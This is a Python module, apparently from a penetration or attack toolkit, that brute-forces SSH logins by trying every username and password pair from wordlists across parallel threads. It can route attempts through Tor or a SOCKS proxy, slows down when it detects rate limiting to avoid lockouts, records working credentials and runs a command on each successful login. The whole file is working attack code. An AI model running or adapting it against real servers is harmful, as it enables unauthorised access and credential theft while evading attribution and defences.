import argparse, time, threading, paramiko, socks
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from tqdm import tqdm
from Dependencies.displays import M, W, R, Y, G, C # handle_error --> No need for now
from Dependencies.save_output import add_result


def log(msg):
    if tqdm:
        tqdm.write(msg)
    else:
        print(msg)


def parse_value(value):
    if value.startswith("@"):
        path = value[1:]
        try:
            with open(path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]

        except FileNotFoundError:
            raise SystemExit(f"[!] File not found: {path}")

    return [value]


def create_proxy_socket(args):
    if args.tor:
        print("[+] Using Tor SOCKS5 proxy 127.0.0.1:9050")
        sock = socks.socksocket()
        sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
        sock.settimeout(args.timeout)
        return sock

    if args.proxy:
        url = urlparse(args.proxy)
        proxy_map = {
            "socks4": socks.SOCKS4,
            "socks5": socks.SOCKS5,
        }

        if url.scheme not in proxy_map:
            raise SystemExit("[!] Only socks4:// and socks5:// are supported")

        print(f"[+] Using proxy {url.hostname}:{url.port}")
        sock = socks.socksocket()
        sock.set_proxy(
            proxy_type=proxy_map[url.scheme],
            addr=url.hostname,
            port=url.port,
            username=url.username,
            password=url.password,
        )

        sock.settimeout(args.timeout)
        return sock
    return None


def ssh_test(args, extracted_domain, username, password, state):
    sock = None
    client = None
    port = 22
    
    with state["lock"]:
        wait_time = state["delay"]

    if wait_time:
        time.sleep(wait_time)

    if args.port:
        port = args.port
    
    if args.verbose:
        log(f"{W}[*] {username}:{password}")
    start = time.perf_counter()
    
    try:
        sock = create_proxy_socket(args)
        if sock:
            sock.connect((extracted_domain, port))

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        params = {
            "hostname": extracted_domain,
            "port": port,
            "username": username,
            "password": password,
            "timeout": args.timeout,
        }

        if sock:
            params["sock"] = sock

        client.connect(**params)
        
        if args.save:
            add_result("SSH", {
                "type": "credentials",
                "data": {
                    "source": "ssh",
                    "host": extracted_domain,
                    "port": port,
                    "username": username,
                    "password": password,
                }
            })
        
        print(f"{G}[+] SSH success: {C}{username}:{password}{W}")
        stdin, stdout, stderr = client.exec_command("whoami")
        print(stdout.read().decode().strip())
        return True

    except paramiko.AuthenticationException as e:
        latency = time.perf_counter() - start
        msg = str(e).lower().rstrip(".")
        if args.verbose:
            log(f"{M}[-] {W}{msg}: {username}:{password} ({latency:.3f}s)")
        
        rate_limit_words = ["too many", "rate limit", "temporarily", "blocked", "connection closed", "banner exchange"]
        if any(word in msg for word in rate_limit_words):
            log(f"{Y}[!] {W}Possible rate limit detected")
            with state["lock"]:
                state["delay"] = min(60, state["delay"] * 2)

        return False


    except paramiko.SSHException as e:
        latency = time.perf_counter() - start
        msg = str(e).lower().rstrip(".")
        if args.verbose:
            log(f"{M}[-] {W}{msg}: {username}:{password} ({latency:.3f}s)")
        
        rate_limit_words = ["too many", "rate limit", "temporarily", "blocked", "connection closed", "banner exchange"]
        if any(word in msg for word in rate_limit_words):
            log(f"{Y}[!] {W}Possible rate limit detected")
            with state["lock"]:
                state["delay"] = min(60, state["delay"] * 2)

        return False

    except Exception as e:
        msg = str(e).lower().rstrip(".")
        if args.verbose:
            log(f"{M}[-] {W}{msg}")

        if any(x in msg for x in ["unable to connect", "connection refused", "timed out", "connection reset"]):
            log(f"{Y}[!] {W}Possible SSH throttling or temporary block")
            with state["lock"]:
                state["delay"] = min(60, state["delay"] * 2)

        return False

    finally:
        if client:
            try:
                client.close()
            except Exception:
                pass

        if sock:
            try:
                sock.close()
            except Exception:
                pass


def dossh(args, extracted_domain):
    usernames_from_file = args.user.startswith("@")
    passwords_from_file = args.password.startswith("@")

    usernames = parse_value(args.user)
    passwords = parse_value(args.password)

    ssh_concurrency = args.concurrency or 1

    state = {
        "delay": 1,
        "lock": threading.Lock(),
        "progress": None
    }

    total_jobs = len(usernames) * len(passwords)

    show_progress = usernames_from_file or passwords_from_file

    jobs = []

    if show_progress:
        state["progress"] = tqdm(
            total=total_jobs,
            desc="SSH",
            unit="test",
            dynamic_ncols=True,
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
        )

    with ThreadPoolExecutor(max_workers=ssh_concurrency) as executor:
        for username in usernames:
            for password in passwords:
                jobs.append(
                    executor.submit(
                        ssh_test,
                        args,
                        extracted_domain,
                        username,
                        password,
                        state
                    )
                )

        for job in as_completed(jobs):
            try:
                if job.result():
                    break

            finally:
                if state.get("progress"):
                    state["progress"].update(1)

        if state.get("progress"):
            state["progress"].close()